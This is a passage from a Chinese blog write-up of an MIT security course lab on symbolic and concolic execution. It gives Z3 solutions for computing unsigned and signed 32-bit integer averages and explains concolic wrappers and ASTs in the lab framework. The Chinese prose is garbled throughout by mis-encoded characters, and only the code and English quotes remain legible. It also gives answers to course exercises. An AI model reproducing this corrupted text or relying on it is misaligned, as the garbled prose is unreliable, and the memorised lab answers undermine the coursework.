ç¬¦å·</strong>é™¤æ³•è¿ç®—ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">u_avg = z3.UDiv(a, <span class="hljs-number">2</span>) + z3.UDiv(b, <span class="hljs-number">2</span>) + ((a % <span class="hljs-number">2</span>) + (b % <span class="hljs-number">2</span>)) / <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>è¿è¡Œ <code>make check</code>ï¼ŒæˆåŠŸé€šè¿‡ Exercise 1ï¼š</p><p><img src="https://s2.loli.net/2022/12/12/RhY7t1pxyVSb5eH.png" alt="image.png"></p><p>é™¤äº†è¿™ä¸ªç®—æ³•ä¹‹å¤–ï¼Œç¬”è€…è¿˜äº†è§£åˆ°æœ‰ä¸€ç§ç®—æ³•æ˜¯åˆ©ç”¨<strong>ä½è¿ç®—</strong>æ¥è¿›è¡Œè®¡ç®—ï¼š</p><ul><li><code>(a &amp; b) + ((a ^ b) &gt;&gt; 1)</code></li></ul><p>è¿™ä¸ªç®—æ³•çš„åŸºæœ¬åŸç†æ˜¯å…ˆæå–å‡º<strong>å…¬æœ‰éƒ¨åˆ†</strong>ï¼Œå†è®¡ç®—<strong>ç§æœ‰éƒ¨åˆ†çš„å¹³å‡å€¼</strong>ï¼Œæœ€åç›¸åŠ å³å¯å¾—åˆ°ç»“æœï¼›è¿™ä¸ªç®—æ³•ä¹Ÿèƒ½é€šè¿‡ Exercise 1 ï¼Œè¿™é‡Œå°±ä¸é‡å¤è´´å›¾äº†</p><p>æ¥ä¸‹æ¥æ˜¯ Challenge 1ï¼šé€šè¿‡ä¿®æ”¹  <code>int-avg.py</code> ä¸­çš„ <code>s_avg = ...</code> ä¸€è¡Œï¼Œå®ç°ä¸€ä¸ªæ­£ç¡®çš„å‡½æ•°ï¼Œä»¥åœ¨ 32 ä½è¿ç®—ä¸‹æ­£ç¡®è®¡ç®—å‡º a ä¸ b çš„<strong>æœ‰ç¬¦å·å¹³å‡å€¼</strong></p><blockquote><p><em>Challenge! (optional)</em> For extra credit, figure out how to compute the average of two 32-bit <em>signed</em> values. Modify the <code>s_avg = ...</code> line in <code>int-avg.py</code>, and run <strong>.&#x2F;int-avg.py</strong> or <strong>make check</strong> to check your answer. Keep in mind the direction of rounding: 3&#x2F;2&#x3D;1 and -3&#x2F;2&#x3D;-1, so so the average of 1 and 2 should be 1, and the average of -2 and -1 should be -1.</p><p>As you explore signed arithmetic, you may find it useful to know that Z3 has two different modulo-like operators. The first is signed modulo, which you get by using <code>a % b</code> in the Python Z3 API. Here, the sign of the result follows the sign of the divisor (i.e., <code>b</code>). For example, <code>-5 % 2 = 1</code>. The second is signed remainder, which you get by using <code>z3.SRem(a, b)</code>. Here, the sign of the result follows the sign of the dividend (i.e., <code>a</code>). With the same example inputs, <code>z3.SRem(-5, 2) = -1</code>.</p></blockquote><p>å¯¹äºå¸¦ç¬¦å·å€¼çš„è¿ç®—è€Œè¨€ï¼Œé™åˆ¶åœ¨ 32 ä½å†…çš„æ­£ç¡®è®¡ç®—ä¾¿æ²¡æœ‰é‚£ä¹ˆç®€å•äº†ï¼Œè‹¥æˆ‘ä»¬ç›´æ¥ç”¨ä¸Šé¢çš„å¼å­è¿›è¡Œè®¡ç®—åˆ™å¾ˆå®¹æ˜“è¢« Z3 æ‰¾åˆ°èƒ½å¯¼è‡´è¿ç®—ç»“æœé”™è¯¯çš„ä¾‹å­ï¼š</p><p><img src="https://s2.loli.net/2022/12/12/VMQFBdz4eICN9qg.png" alt="image.png"></p><p>ä¸ºä»€ä¹ˆåœ¨æœ‰ç¬¦å·é™¤æ³•ä¸‹è®¡ç®—å‡ºæ¥çš„ç»“æœä¸ä¸€è‡´å‘¢ï¼Ÿè¿™æ˜¯å› ä¸ºåœ¨é¢˜ç›®ä¸­<del>MIT éå¸¸SBåœ°</del>å¯¹äºæ­£æ•°é™¤æ³•å…¶é€‰æ‹©<strong>å‘ä¸‹å–æ•´</strong>ï¼Œå¯¹äºè´Ÿæ•°é™¤æ³•çš„æˆªæ–­ï¼Œå…¶é€‰æ‹©çš„æ˜¯<strong>å‘ä¸Šå–æ•´</strong>ï¼Œä½†æˆ‘ä»¬çš„ç®—æ³•æ˜¯<strong>æ­£æ•°ä¸è´Ÿæ•°çš†å‘ä¸‹å–æ•´</strong>ï¼Œå› æ­¤è®¡ç®—ç»“æœå°±å‡ºç°äº†åå·®</p><p>ç”±äºæ­£æ•°éƒ¨åˆ†æ²¡æœ‰é—®é¢˜ï¼Œå› æ­¤è¿™é‡Œæˆ‘ä»¬éœ€è¦å¯¹è®¡ç®—ç»“æœä¸ºè´Ÿæ•°çš„æƒ…å†µè¿›è¡Œç‰¹æ®ŠåŒ–å¤„ç†ï¼Œ<strong>åœ¨ç»“æœä¸ºè´Ÿæ•°æ—¶å°†å‘ä¸‹å–æ•´å˜ä¸ºå‘ä¸Šå–æ•´</strong>ï¼Œå› æ­¤æœ€åçš„è®¡ç®—å…¬å¼å¦‚ä¸‹ï¼š</p><ul><li><code>tmp = (a &amp; b) + ((a ^ b) &gt;&gt; 1)</code></li><li><code>res = tmp + ((tmp &gt;&gt; 31) &amp; (a ^ b))</code></li></ul><p><strong>é¦–å…ˆæŒ‰ç…§æˆ‘ä»¬åŸæ¥çš„å…¬å¼è®¡ç®—å‡ºå‘ä¸‹å–æ•´çš„ç»“æœï¼Œæ¥ä¸‹æ¥å¯¹å…¶ç¬¦å·ä½è¿›è¡Œåˆ¤æ–­ï¼Œè‹¥ä¸º 1 åˆ™å†åˆ¤æ–­å…¶ç§æœ‰éƒ¨åˆ†å¹³å‡å€¼çš„è®¡ç®—æ˜¯å¦å‘ç”Ÿæˆªæ–­ï¼ˆå³ç§æœ‰éƒ¨åˆ†å’Œæ˜¯å¦ä¸ºå¥‡æ•°ï¼‰ï¼Œè‹¥æ˜¯åˆ™è¯´æ˜ç»“æœå‘ç”Ÿäº†å‘ä¸‹å–æ•´ï¼Œæ­¤æ—¶å˜ä¸ºå‘ä¸Šå–æ•´å³å¯</strong></p><p>ç”±äºè¦å¯¹ç¬¦å·ä½è¿›è¡Œåˆ¤æ–­ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨ <code>z3.LShR()</code> å°†åˆå§‹è¿ç®—ç»“æœä½œä¸ºæ— ç¬¦å·æ•´å‹è¿›è¡Œå³ç§»æ“ä½œï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">tmp = (a &amp; b) + ((a ^ b) &gt;&gt; <span class="hljs-number">1</span>)<br>s_avg = tmp + (z3.LShR(tmp, <span class="hljs-number">31</span>) &amp; (a ^ b))<br></code></pre></td></tr></table></figure><p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼ŒæˆåŠŸé€šè¿‡ Challenge 1ï¼š</p><p><img src="https://s2.loli.net/2022/12/13/mLWgZvYRqnXSJfx.png" alt="image.png"></p><h2 id="Interlude-what-are-symbolic-and-concolic-execution"><a href="#Interlude-what-are-symbolic-and-concolic-execution" class="headerlink" title="Interlude: what are symbolic and concolic execution?"></a>Interlude: what are symbolic and concolic execution?</h2><p>æ­£å¦‚æˆ‘ä»¬å‰é¢åœ¨ EXE çš„è®ºæ–‡ä¸­æ‰€è§ï¼Œç¬¦å·æ‰§è¡Œæ˜¯ä¸€ç§é€šè¿‡è§‚æµ‹ç¨‹åºåœ¨ä¸åŒè¾“å…¥ä¸‹å¦‚ä½•è¡¨ç°æ¥è¿›è¡Œç¨‹åºæµ‹è¯•çš„æ–¹æ³•ï¼Œé€šå¸¸è€Œè¨€å…¶ç›®çš„æ˜¯ä¸ºäº†è·å¾—æ›´é«˜çš„ <strong><a href="https://en.wikipedia.org/wiki/Code_coverage">ä»£ç è¦†ç›–ç‡</a></strong> ï¼ˆcode coverageï¼‰æˆ–æ˜¯ <strong>è·¯å¾„è¦†ç›–ç‡</strong> ï¼ˆpath coverageï¼‰ï¼Œåœ¨å®‰å…¨ä¸­å…¶æ¯”ä¼ ç»Ÿä»£ç æ‰§è¡Œæ›´èƒ½è§¦å‘ç½•è§çš„å¯èƒ½åŒ…å«æ¼æ´çš„ä»£ç è·¯å¾„</p><p>ä»æ›´é«˜å±‚æ¬¡è€Œè¨€ï¼Œè‹¥æˆ‘ä»¬è¦æ„å»ºä¸€ä¸ªç¬¦å·æ‰§è¡Œç³»ç»Ÿï¼Œæˆ‘ä»¬éœ€è¦è§£å†³ä»¥ä¸‹å‡ ç‚¹ï¼š</p><ul><li>ç”±äºç¨‹åºåŒ…å«åŸºäºè¾“å…¥çš„ä¸­é—´å€¼ï¼ˆä¾‹å¦‚è¾“å…¥ä¸¤ä¸ªæ•´å‹å¹¶è®¡ç®—å¹³å‡å€¼ï¼Œå¹¶å­˜æ”¾åœ¨ä¸€äº›å˜é‡ä¸­ï¼‰ï¼Œæˆ‘ä»¬éœ€è¦è®°ä½è¾“å…¥ä¸è¿™äº›ä¸­é—´å€¼é—´çš„å…³ç³»ï¼Œé€šå¸¸è¿™é€šè¿‡å…è®¸å˜é‡æˆ–å†…å­˜ä½ç½®æœ‰  <em>å…·ä½“çš„</em> ï¼ˆconcreteï¼Œä¾‹å¦‚ 114514 è¿™æ ·çš„å®é™…å€¼ï¼‰ æˆ–  <em>ç¬¦å·çš„</em>  ï¼ˆsymbolicï¼Œä¾‹å¦‚æˆ‘ä»¬åœ¨ä¸Šä¸€å°èŠ‚æ„å»ºçš„ç¬¦å·å˜é‡ï¼‰ å€¼</li><li>æˆ‘ä»¬éœ€è¦æ ¹æ®è¾“å…¥æ¥ç¡®å®šè¦æ‰§è¡Œçš„æ§åˆ¶æµåˆ†æ”¯ï¼Œè¿™å½’ç»“äºåœ¨ç¨‹åºæ¯æ¬¡å‘ç”Ÿåˆ†æ”¯æ—¶æ„å»ºç¬¦å·çº¦æŸï¼Œåœ¨ç¨‹åºé€‰æ‹©ä¸€äº›ç‰¹å®šåˆ†æ”¯æ—¶æè¿°å¸ƒå°”æ¡ä»¶ï¼ˆä»¥ç¨‹åºåŸæœ‰è¾“å…¥çš„å½¢å¼ï¼‰ï¼›ç”±äºæˆ‘ä»¬æŒç»­ä¿å­˜ä¸­é—´å€¼ä¸ç¨‹åºåŸæœ‰è¾“å…¥çš„é—´éš™ï¼Œæˆ‘ä»¬å¹¶ä¸éœ€è¦é€šè¿‡åŸæœ‰è¾“å…¥æ¥è®¡ç®—çº¦æŸï¼Œè¿™äº›çº¦æŸå°±åƒæˆ‘ä»¬åœ¨å‰æ–‡ä¸­ç”¨æ¥å¯»æ‰¾æ•´å‹ä¸­æ¼æ´çš„çº¦æŸï¼›ç¡®å®šæ§åˆ¶æµçº¦æŸéå¸¸é‡è¦ï¼Œå› ä¸ºè‹¥ç¨‹åºåˆå§‹æ—¶è¿›å…¥äº†ç‰¹å®šåˆ†æ”¯è·¯å¾„ï¼Œæˆ‘ä»¬æƒ³è¦çŸ¥é“å¦‚ä½•è®©ä»–èµ°åˆ°å¦ä¸€æ¡è·¯å¾„æ¥å¯»æ‰¾æ˜¯å¦å­˜åœ¨æ¼æ´ï¼Œåœ¨ EXE çš„è®ºæ–‡ä¸­ä½¿ç”¨äº†ä¸€ä¸ª C-to-C çš„ç¿»è¯‘å™¨æ¥åœ¨æ‰€æœ‰çš„åˆ†æ”¯ä¸Šæ’å…¥ä»–ä»¬çš„ä»£ç </li><li>å¯¹äºæ¯ä¸€æ¡ä¸Šè¿°åˆ†æ”¯ï¼Œæˆ‘ä»¬éœ€è¦å†³å®šæ˜¯å¦æœ‰ä¸€ä¸ªè¾“å…¥èƒ½å¤Ÿè®©ç¨‹åºåœ¨ä¸€æ¡åˆ†æ”¯ä¸Šæ‰§è¡Œå¦ä¸€æ¡è·¯å¾„ï¼ˆæ›´å‡†ç¡®åœ°è¯´ï¼Œæˆ‘ä»¬è€ƒè™‘æ•´ä¸ªæ§åˆ¶æµè·¯å¾„è€Œéå•ä¸ªè·¯å¾„ï¼‰ï¼Œè¿™å¸®åŠ©æˆ‘ä»¬åœ¨ç¨‹åºä¸­å¯»æ‰¾å¯ä»¥è®©æˆ‘ä»¬é€šè¿‡è°ƒæ•´è¾“å…¥æ¥å½±å“çš„æ§åˆ¶æµæ¡ä»¶ï¼Œæ‰€æœ‰çš„ç¬¦å·æ‰§è¡Œç³»ç»Ÿéƒ½åŸºäº SMT æ±‚è§£å™¨æ¥å®Œæˆè¿™äº›å·¥ä½œ</li><li>æˆ‘ä»¬éœ€è¦ç¡®å®šæˆ‘ä»¬åœ¨æµ‹è¯•ä¸­å¯»æ‰¾çš„æ˜¯ä»€ä¹ˆï¼Œè¿™æ˜¯æˆ‘ä»¬ä»ç¨‹åºä¸­ç¡®ä¿  <em>ä¸å˜é‡</em>  ï¼ˆinvariantï¼‰æ¥è€ƒè™‘çš„æœ€ä½³æ–¹æ³•ï¼Œè€Œç¬¦å·æ‰§è¡Œå¯»æ‰¾æ”¹å˜è¿™äº›å¸¸é‡çš„è¾“å…¥ï¼ˆ<del>ğŸ‘´ä¹Ÿæ²¡å’‹è¯»æ˜ç™½ï¼Œå¯ä»¥çœ‹å®éªŒæ‰‹å†ŒåŸå¥</del>ï¼‰ï¼›æˆ‘ä»¬å¯ä»¥å¯»æ‰¾çš„äº‹ç‰©ä¹‹ä¸€æ˜¯<strong>ç¨‹åºå´©æºƒ</strong>ï¼ˆcrashesï¼Œå³ä¸å˜é‡æ˜¯  <em>æˆ‘ä»¬çš„ç¨‹åºä¸åº”å½“å´©æºƒ</em>  ï¼‰ï¼Œåœ¨ C ç¨‹åºä¸­è¿™éå¸¸æœ‰æ„ä¹‰ï¼Œå› ä¸º crashes é€šå¸¸æŒ‡ç¤ºäº†ä»£è¡¨æ¼æ´çš„å†…å­˜æŸåï¼Œåœ¨ Python è¿™æ ·æ›´é«˜çº§çš„è¯­è¨€ä¸­åœ¨è®¾è®¡ä¸Šå¹¶ä¸å­˜åœ¨å†…å­˜æŸåï¼Œä½†æˆ‘ä»¬ä»ç„¶å¯ä»¥å¯»æ‰¾å¦‚ Python ä»£ç çº§çš„ä»£ç æ³¨å…¥æ”»å‡»ï¼ˆä¾‹å¦‚ <code>eval()</code> ï¼‰æˆ–æ˜¯ç‰¹å®šäºæŸç§åº”ç”¨çš„å½±å“å®‰å…¨çš„ä¸å˜é‡</li><li>æœ€ç»ˆï¼Œå¯¹äºç»™å‡ºç¨‹åºä¸­æ‰€æœ‰å¯èƒ½æ‰§è¡Œçš„æ§åˆ¶æµè·¯å¾„ï¼Œæˆ‘ä»¬éœ€è¦å†³å®šè¯¥å°è¯•å“ªæ¡è·¯å¾„ï¼Œå› ä¸ºè·¯å¾„æ•°é‡ä¼šéšç€ç¨‹åºè§„æ¨¡çš„å¢å¤§è€Œå¿«é€Ÿå¢é•¿ï¼Œæˆ‘ä»¬ä¸å¯èƒ½å°è¯•æ‰€æœ‰çš„è·¯å¾„ï¼Œå› æ­¤ç¬¦å·æ‰§è¡Œç³»ç»Ÿé€šå¸¸åŒ…å«ç¡®å®šå“ªä¸€æ¡è·¯å¾„æ›´æœ‰å¸Œæœ›å‘ç°ç ´åä¸å˜é‡çš„æŸç§  <em>è°ƒåº¦å™¨</em>  ï¼ˆschedulerï¼‰æˆ–  <em>æœç´¢ç­–ç•¥</em>  ï¼ˆsearch strategyï¼‰ï¼Œä¸€ä¸ªç®€å•çš„æœç´¢ç­–ç•¥ä¾‹å­ä¾¿æ˜¯å°è¯•æœªæ‰§è¡Œè¿‡çš„è·¯å¾„ï¼Œè¿™ä»£è¡¨ç€æ›´é«˜çš„ä»£ç è¦†ç›–ç‡ä¸æœªè¢«å‘ç°çš„æ¼æ´çš„å­˜åœ¨çš„å¯èƒ½æ€§</li></ul><p>ä¸ç¬¦å·æ‰§è¡Œç›¸å¯¹çš„ä¸€ä¸ªé€‰æ‹©æ˜¯  <a href="https://en.wikipedia.org/wiki/Fuzz_testing">fuzzing</a> ï¼ˆåˆç§° fuzz-testingï¼Œæ¨¡ç³Šæµ‹è¯•ï¼‰ï¼Œå…¶é€‰æ‹©äº†ä¸€ä¸ªéšæœºåŒ–æ–¹æ¡ˆï¼šä¸åŒäºå…³æ³¨è§¦å‘åº”ç”¨ä¸­ä¸åŒä»£ç è·¯å¾„çš„åŸå› ï¼Œfuzzing ä¼šåˆ›å»ºéšæœºçš„å…·ä½“å€¼äº¤ç»™ç¨‹åºæ‰§è¡Œå¹¶æ£€æŸ¥å…¶è¡Œä¸ºï¼›è™½ç„¶è¿™æ¯”ç¬¦å·æ‰§è¡Œæ›´ç®€å•ï¼Œä½†é€šå¸¸å¾ˆéš¾æ„é€ èƒ½æ»¡è¶³ç¨‹åºä»£ç ä¸­ä¸€äº›ç‰¹å®šæƒ…å†µçš„è¾“å…¥</p><p>æ„å»ºç¬¦å·æ‰§è¡Œç³»ç»Ÿçš„ä¸€ä¸ªæŒ‘æˆ˜æ˜¯æˆ‘ä»¬çš„ç³»ç»Ÿéœ€è¦çŸ¥é“å¦‚ä½•åœ¨ç¬¦å·å€¼ä¸Šæ‰§è¡Œæ‰€æœ‰å¯èƒ½çš„æ“ä½œï¼ˆä¸Šé¢çš„ Step 1 &amp; 2ï¼‰ï¼Œåœ¨æœ¬ Lab ä¸­æˆ‘ä»¬å°†åœ¨ Python å¯¹è±¡ï¼ˆæ›´å‡†ç¡®åœ°è¯´ï¼Œæ•´å‹ä¸å­—ç¬¦ä¸²ï¼‰ä¸Šå®è·µï¼Œå¯¹äºç¬¦å·æ‰§è¡Œè€Œè¨€è¿™å¾ˆæœ‰æŒ‘æˆ˜æ€§ï¼Œå› ä¸º Python å¯¹è±¡å¯ä»¥å®ç°çš„æ“ä½œæœ‰å¾ˆå¤š</p><p>å¹¸è¿çš„æ˜¯æˆ‘ä»¬è¿˜æœ‰ä¸€ä¸ªæ›´ç®€å•çš„é€‰æ‹©â€”â€”  <em>æ··åˆæ‰§è¡Œ</em>  ï¼ˆ<strong>concolic execution</strong>ï¼‰ï¼Œä»‹äºå®Œå…¨éšæœºçš„æ¨¡ç³Šæµ‹è¯•ä¸å®Œå…¨çš„ç¬¦å·æ‰§è¡Œä¹‹é—´ï¼Œç›¸è¾ƒäºè·Ÿè¸ªçº¯å‡€çš„ç¬¦å·å€¼ï¼ˆå¦‚ EXE ä¸­æ‰€åšï¼‰ï¼Œå…¶æ€æƒ³æ˜¯ï¼šå¯¹äºä»è¾“å…¥ä¸­å¾—åˆ°çš„å˜é‡ï¼Œæˆ‘ä»¬å¯ä»¥<strong>åŒæ—¶ä¿å­˜ä¸€ä¸ªå…·ä½“å€¼ä¸ä¸€ä¸ªç¬¦å·å€¼</strong>ï¼Œç”±æ­¤ï¼š</p><ul><li>è‹¥æˆ‘ä»¬çš„ concolic system çŸ¥é“åº”ç”¨çš„è¡Œä¸ºï¼Œæˆ‘ä»¬å¯ä»¥åƒç¬¦å·æ‰§è¡Œé‚£æ ·è¿è¡Œï¼ˆé™¤äº†æˆ‘ä»¬è¿˜ä¼šåŒæ—¶ä¼ æ’­æ¯ä¸ªå€¼çš„ concrete éƒ¨åˆ†ï¼‰ï¼›ä¾‹å¦‚ï¼Œå‡è®¾æˆ‘ä»¬æœ‰ä¸¤ä¸ª concolic æ•´å‹å˜é‡ <code>aa</code> ä¸ <code>bb</code>ï¼Œå…¶æœ‰ç€å…·ä½“å€¼ <code>5</code> ä¸ <code>6</code> ï¼Œå¹¶å¯¹åº”ç¬¦å·è¡¨è¾¾å¼ <code>a</code> ä¸  <code>b</code>ï¼Œæ­¤æ—¶è‹¥åº”ç”¨åˆ›å»ºäº†ä¸€ä¸ªå˜é‡ <code>cc = aa + bb</code>ï¼Œå…¶ä¼šåŒæ—¶æœ‰ç€å…·ä½“å€¼ <code>11</code> åŠç¬¦å·è¡¨è¾¾å¼ <code>a + b</code>ï¼›ç±»ä¼¼åœ°ï¼Œè‹¥åº”ç”¨åœ¨ <code>cc == 12</code> çš„åˆ†æ”¯ä¸Šæ‰§è¡Œï¼Œç¨‹åºå¯ä»¥åƒåˆ†æ”¯ä¸ºå‡ä¸€æ ·æ‰§è¡Œï¼Œå¹¶è®°å½•å¯¹åº”çš„ç¬¦å·åˆ†æ”¯æ¡ä»¶ <code>a + b != 12</code></li><li>è‹¥æˆ‘ä»¬çš„ concolic system ä¸çŸ¥é“åº”ç”¨çš„å½“å‰è¡Œä¸ºï¼Œåº”ç”¨å°†åªä¼šå¾—åˆ°å…·ä½“çš„å€¼ï¼›ä¾‹å¦‚è‹¥åº”ç”¨å°† <code>cc</code> å†™å…¥æ–‡ä»¶ä¸­ï¼Œæˆ–è€…æ˜¯ä¼ é€’åˆ°å¤–éƒ¨åº“ä¸­ï¼Œä»£ç ä»å¯ä»¥ä½¿ç”¨å…·ä½“å€¼ <code>11</code> å¦‚åŒåº”ç”¨æ­£å¸¸è¿è¡Œé‚£æ ·ç»§ç»­æ‰§è¡Œ</li></ul><p>å¯¹äºæœ¬ lab è€Œè¨€ï¼Œæ··åˆæ‰§è¡Œçš„å¥½å¤„æ˜¯æˆ‘ä»¬å¹¶ä¸éœ€è¦å®Œå…¨å®Œæˆå¯¹ç¬¦å·å€¼çš„æ“ä½œæ”¯æŒï¼Œæˆ‘ä»¬åªéœ€è¦æ”¯æŒè¶³å¤Ÿå‘ç°æ¼æ´çš„æ“ä½œå³å¯ï¼ˆå®é™…ä¸Šå¤§éƒ¨åˆ†æŒ–æ´ç³»ç»Ÿä¹Ÿæ˜¯å¦‚æ­¤ï¼‰ï¼Œä¸è¿‡è‹¥åº”ç”¨æ‰§è¡Œäº†æˆ‘ä»¬æ‰€ä¸æ”¯æŒçš„æ“ä½œï¼Œæˆ‘ä»¬å°†å¤±å»å¯¹ç¬¦å·éƒ¨åˆ†çš„è·Ÿè¸ªï¼Œå¹¶æ— æ³•å¯¹è¿™äº›è·¯å¾„è¿›è¡Œç¬¦å·æ‰§è¡Œå¼çš„ï¼ˆsymbolic-execution-styleï¼‰æ¢ç´¢ï¼Œè‹¥æƒ³äº†è§£æ›´å¤šå¯ä»¥å‚è§  <a href="http://css.csail.mit.edu/6.858/2022/readings/dart.pdf">DART paper</a> </p><h2 id="Concolic-execution-for-integers"><a href="#Concolic-execution-for-integers" class="headerlink" title="Concolic execution for integers"></a>Concolic execution for integers</h2><p>é¦–å…ˆæˆ‘ä»¬å°†ä¸ºæ•´å‹å€¼æ„å»ºä¸€ä¸ªæ··åˆæ‰§è¡Œç³»ç»Ÿï¼Œæœ¬ Lab ä¸ºæˆ‘ä»¬çš„æ··åˆæ‰§è¡Œæä¾›çš„æ¡†æ¶ä»£ç ä½äº <code>symex/fuzzy.py</code> ä¸­ï¼Œå…¶å®ç°äº†å‡ ä¸ªé‡è¦çš„æŠ½è±¡å±‚ï¼š</p><ul><li><p><strong>æŠ½è±¡è¯­æ³•æ ‘</strong>ï¼ˆThe ASTï¼‰ï¼šä¸æ­¤å‰æˆ‘ä»¬åœ¨ <code>int-avg.py</code> ä¸­ä½¿ç”¨ Z3 è¡¨è¾¾å¼æ¥è¡¨ç¤ºç¬¦å·å€¼æ‰€ä¸åŒçš„æ˜¯ï¼Œæœ¬ Lab æ„å»ºäº†å…¶è‡ªå·±çš„æŠ½è±¡è¯­æ³•æ ‘ï¼ˆabstract syntax treeï¼‰æ¥è¡¨è¾¾ç¬¦å·è¡¨è¾¾å¼ï¼Œä¸€ä¸ª AST èŠ‚ç‚¹å¯ä»¥æ˜¯ä¸€ä¸ªç®€å•çš„å˜é‡ï¼ˆ <code>sym_str</code> æˆ– <code>sym_int</code> å¯¹è±¡ï¼‰ã€ä¸€ä¸ªå¸¸é‡ï¼ˆ<code>const_int</code>ã€<code>const_str</code> æˆ– <code>const_bool</code> å¯¹è±¡ï¼‰ã€æˆ–æ˜¯ä¸€äº›å°†å…¶ä»– AST èŠ‚ç‚¹ä½œä¸ºå‚æ•°çš„å‡½æ•°æˆ–æ“ä½œç¬¦ï¼ˆä¾‹å¦‚ <code>sym_eq(a, b)</code> è¡¨ç¤ºå¸ƒå°”è¡¨è¾¾å¼ <code>a==b</code>ï¼Œå…¶ä¸­ <code>a</code> ä¸ <code>b</code> éƒ½æ˜¯ AST èŠ‚ç‚¹ï¼Œæˆ–æ˜¯ <code>sym_plus(a, b)</code> è¡¨ç¤ºæ•´å‹è¡¨è¾¾å¼ <code>a + b</code>ï¼‰</p><p>æ¯ä¸ª AST èŠ‚ç‚¹ <code>n</code> éƒ½å¯ä»¥ä½¿ç”¨ <code>z3expr(n)</code> è½¬åŒ–ä¸º Z3 è¡¨è¾¾å¼ï¼Œè¿™ç”±è°ƒç”¨ <code>n._z3expr</code> å®Œæˆï¼Œå³æ¯ä¸ª AST èŠ‚ç‚¹éƒ½å®ç°äº†è¿”å›å¯¹åº” Z3 è¡¨è¾¾å¼çš„ <code>_z3expr</code> æ–¹æ³•</p><p>æˆ‘ä»¬ä½¿ç”¨è‡ªå·±çš„ AST å±‚è€Œéä½¿ç”¨ Z3 çš„ç¬¦å·è¡¨ç¤ºçš„åŸå› æ˜¯å› ä¸ºæˆ‘ä»¬éœ€è¦å®ç°ä¸€äº› Z3 è¡¨ç¤ºéš¾ä»¥å®Œæˆçš„æ“ä½œï¼Œæ­¤å¤–æˆ‘ä»¬éœ€è¦åˆ†å‡ºä¸€ä¸ªç‹¬ç«‹çš„è¿›ç¨‹æ¥è°ƒç”¨ Z3 çš„æ±‚è§£å™¨ï¼Œä»¥åœ¨ Z3 æ±‚è§£å™¨è€—æ—¶è¿‡é•¿æ—¶æ€æ­»è¿›ç¨‹â€”â€”å°†çº¦æŸå½’ä¸ºä¸å¯è§£ï¼ˆè¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬å¯èƒ½å¤±å»è¿™äº›è·¯å¾„ï¼Œä½†è‡³å°‘æˆ‘ä»¬ä¼šè®©ç¨‹åºæ¢ç´¢å…¶ä»–è·¯å¾„ï¼‰ï¼›ä½¿ç”¨æˆ‘ä»¬è‡ªå·±çš„ AST èƒ½è®©æˆ‘ä»¬å°† Z3 çŠ¶æ€å®Œå…¨ç‹¬ç«‹åœ¨ fork å‡ºçš„è¿›ç¨‹é‡Œ</p></li><li><p><strong>æ··åˆå°è£…</strong>ï¼ˆThe concolic wrappersï¼‰ï¼šä¸ºäº†æ‹¦æˆª python-level çš„æ“ä½œå¹¶è¿›è¡Œæ··åˆæ‰§è¡Œï¼Œæˆ‘ä»¬å°†å¸¸è§„çš„ <code>int</code> ä¸ <code>str</code> å¯¹è±¡æ›¿æ¢æˆäº†æ··åˆçš„å­ç±»ï¼š<code>concolic_int</code> ç»§æ‰¿è‡ª <code>int</code> è€Œ <code>concolic_str</code> ç»§æ‰¿è‡ª <code>str</code>ï¼Œæ¯ä¸€ä¸ªæ··åˆå°è£…éƒ½åŒæ—¶å­˜å‚¨ä¸€ä¸ªå…·ä½“å€¼ï¼ˆ<code>self.__v</code> ï¼‰ä¸ä¸€ä¸ªç¬¦å·è¡¨è¾¾å¼ï¼ˆä¸ AST èŠ‚ç‚¹ï¼Œåœ¨ <code>self.__sym</code>ï¼‰ï¼Œå½“åº”ç”¨åœ¨è®¡ç®—æ··åˆå€¼è¡¨è¾¾å¼ï¼ˆä¾‹å¦‚ <code>a+1</code> ä¸­çš„ <code>a</code> ä¸º <code>concolic_int</code>ï¼‰ï¼Œæˆ‘ä»¬éœ€è¦æ‹¦æˆªè¯¥æ“ä½œå¹¶è¿”å›ä¸€ä¸ªåŒæ—¶åŒ…å«å…·ä½“å€¼ä¸ç¬¦å·è¡¨è¾¾å¼çš„çš„æ··åˆå€¼</p><p>ä¸ºäº†å®ç°è¿™æ ·çš„æ‹¦æˆªæ“ä½œï¼Œæˆ‘ä»¬é‡è½½äº† <code>concolic_int</code> ä¸ <code>concolic_str</code> ç±»ä¸­çš„ä¸€äº›æ–¹æ³•ï¼Œä¾‹å¦‚ <code>concolic_int.__add__</code> åœ¨ä¸Šé¢çš„ä¾‹å­ <code>a + 1</code> ä¸­ä¼šè¢«è°ƒç”¨å¹¶è¿”å›ä¸€ä¸ªæ–°çš„æ··åˆå€¼è¡¨ç¤ºç»“æœ</p><p>åŸåˆ™ä¸Šæˆ‘ä»¬åº”è¯¥ä¹Ÿè¦æœ‰ä¸€ä¸ª <code>concolic_bool</code> ä½œä¸º <code>bool</code> çš„å­ç±»ï¼Œä¸å¹¸çš„æ˜¯åœ¨ Python ä¸­ <code>bool</code> ä¸èƒ½è¢«ç»§æ‰¿ï¼ˆå‚è§<a href="https://docs.python.org/3/library/functions.html#bool">è¿™é‡Œ</a> ä¸ <a href="https://mail.python.org/pipermail/python-dev/2002-March/020822.html">è¿™é‡Œ</a>ï¼‰ï¼Œäºæ˜¯æˆ‘ä»¬åˆ›å»ºäº†å‡½æ•° <code>concolic_bool</code> ä½œä¸ºä»£æ›¿ï¼Œå½“æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªæ··åˆå¸ƒå°”å€¼æ—¶ï¼Œç¨‹åºä¼šæŒ‰å…¶å€¼è¿›è¡Œåˆ†æ”¯ï¼Œæ•… <code>concolic_bool</code> ä¹Ÿä¼šä¸ºå½“å‰è·¯å¾„æ¡ä»¶æ·»åŠ ä¸€ä¸ªçº¦æŸï¼ˆå¸ƒå°”å€¼çš„ç¬¦å·è¡¨è¾¾å¼ä¸å…·ä½“å€¼ç›¸ç­‰çš„çº¦æŸï¼‰ï¼Œå¹¶è¿”å›ä¸€ä¸ªå…·ä½“çš„å¸ƒå°”å€¼</p></li><li><p><strong>å…·ä½“è¾“å…¥</strong>ï¼ˆThe concrete 